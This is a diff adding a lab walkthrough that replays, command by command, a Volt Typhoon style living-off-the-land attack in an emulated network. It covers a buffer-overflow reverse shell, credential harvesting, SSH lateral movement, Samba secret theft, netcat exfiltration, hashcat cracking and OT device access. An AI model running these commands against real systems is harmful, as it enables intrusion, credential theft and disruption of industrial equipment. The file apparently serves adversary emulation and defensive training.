@@ -1,0 +1,120 @@
+This is a replication of the commands, in order, that a Volt Typhoon style attack might feature. 
+It is a pure LOTL attack, with no modules being installed during the attack and only relying on preinstalled 
+software. Some rudimentary attempts at defense evasion, such as removing Indicators of Compromise are also made.
+
+- The attack commences with a buffer overflow attack resulting in a reverse shell sent to the attacker's host machine. 
+- Once initial access is gained, the shell is upgraded to allow job control. 
+- then, vpn access credentials are gained from the firewall's log and domain controller credentials from an unsecured backup accessible from the admin's dashboard. 
+- the admin's machine is then laterally moved to using SSH (instead of Volt Typhoon's usual RDP, which is not possible in Kathara). 
+- From there, an unsecured Samba share with low-privileged access reveals the OT access credentials.
+- The domain controller can also be accessed from the admin directly by SSH (using the creds found on the web page)
+- The domain controller's smb.conf and samba/private files are compressed and moved through corpadmin, back to the firewall
+- The compressed files remain an indicator of compromise so are deleted when moved off a host.
+- The compressed files are sent to the attacker from the edge firewall via netcat
+- the attacker sets up an environment to perform offline cracking, determines the accounts stored in the domain controller and uses hashcat to brute-force a collision
+- Newly armed with OT credentials, the attacker moves laterally, back to the corpadmin host and then to the jumpbox through the it/ot bridge
+- from the jumpbox, the attacker is able to use information found in local logs and from the unsecured fileserver to access and modify operational technology assets.
+- this can be confirmed by accessing the human/machine interface. 
+
+Actions taken:
+
+tmux
+
+(ctrl+B C)
+
+(ctrl+B 0)
+
+curl 172.16.0.1:8080/admin?overflow=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabypassreturnstatement&nc -lvnp 4444
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+cat /www/backup/config.bak
+
+cat /var/log/vpn_logs/access_log.log
+
+ssh corpadmin@10.10.10.30
+
+smbclient -L //10.10.10.20 -U %
+
+smbclient //10.10.10.20/ot_docs -U % -c "get OT_Network_Diagram_and_Vendor_Defaults.txt -" | cat
+
+sshpass -p 'Summer2026!' ssh -o StrictHostKeyChecking=no 'svc_backup'@10.10.10.10
+
+find /var/lib/samba private | grep private
+find /etc/samba smb.conf | grep smb.conf
+
+tar -czvf lol1.tar.gz /etc/samba
+tar -czvf lol2.tar.gz /var/lib/samba/private
+tar -czvf lol.tar.gz .
+
+scp lol.tar.gz corpadmin@10.10.10.30:/home/corpadmin
+rm lol.tar.gz lol1.tar.gz lol2.tar.gz
+
+exit
+
+exit
+
+scp corpadmin@10.10.10.30:/home/corpadmin/lol.tar.gz /
+
+ssh corpadmin@10.10.10.30
+
+rm lol.tar.gz
+
+exit
+
+(ctrl+B 1)
+
+nc -l -p 80 > lol.tar.gz
+
+(ctrl+B 0)
+
+nc 172.16.0.10 80 < lol.tar.gz
+
+rm lol.tar.gz
+
+(ctrl+B 1)
+
+(ctrl+C) #This one is very important. If you ctrl+C from the other tab, the reverse shell will be broken and the server won't be able to reproduce it.
+
+mkdir testing
+mv lol.tar.gz testing
+cd testing
+
+tar -xzf lol.tar.gz
+tar -xzf lol1.tar.gz
+tar -xzf lol2.tar.gz
+
+rm -r /var/lib/samba/private
+mv var/lib/samba/private /var/lib/samba/
+pdbedit -L -w -s etc/samba/smb.conf
+
+(extract the hashes for the chosen accounts)
+
+hashcat -m 1000 41AED72CEC76816423703D8E545EEA31 /etc/short-wordlist # for svc_backup - a test. We need to find the OT creds.
+
+hashcat -m 1000 CE75ED23AE402173B583296C9DF49B01 /etc/short-wordlist # for OT creds
+
+(Ctrl+B 0)
+
+ssh corpadmin@10.10.10.30
+
+sshpass -p "Ch@ngeMe2026" ssh -o StrictHostKeyChecking=no otadmin@10.20.20.5
+
+ls /var/log | grep ot
+
+ls /var/log/ot_logs
+
+cat /var/log/ot_logs/rockwell_log.log
+cat /var/log/ot_logs/unitronics_log.log
+
+nc 10.30.30.12 44818
+
+<disruptive commands>
+
+nc 10.30.30.11 20256
+
+<disruptive commands>
+
+exit
+
+curl 10.20.20.5:8888
